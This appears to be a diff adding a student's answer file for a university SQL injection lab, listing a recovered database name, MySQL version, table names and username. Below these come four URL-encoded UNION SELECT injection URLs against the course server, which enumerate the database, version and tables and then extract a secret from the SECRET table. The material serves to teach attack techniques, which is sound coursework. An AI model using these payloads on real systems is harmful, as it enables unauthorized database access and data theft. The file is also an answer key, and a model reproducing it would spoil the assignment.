@@ -1,0 +1,9 @@
+proj2_inject3
+5.5.55-0ubuntu0.14.04.1
+HINT, SECRET, foo, inject3_users
+charlie
+
+http://trurl.cs.illinois.edu/sqlinject3/?id=0%27+union+select+1%2C2%2C3%2Cdatabase%28%29%23
+http://trurl.cs.illinois.edu/sqlinject3/?id=0%27+union+select+1%2C2%2C3%2C%40%40version%23
+http://trurl.cs.illinois.edu/sqlinject3/?id=0%27+union+select+1%2C2%2C3%2Cgroup_concat%28table_name+separator+%27%2C+%27%29+from+information_schema.tables+where+table_type%3D%27base+table%27%23
+http://trurl.cs.illinois.edu/sqlinject3/?id=0%27+union+select+1%2C2%2C3%2Csecret+from+SECRET+where+hash%3Dmd5%28%27mschoi2%27%29%23
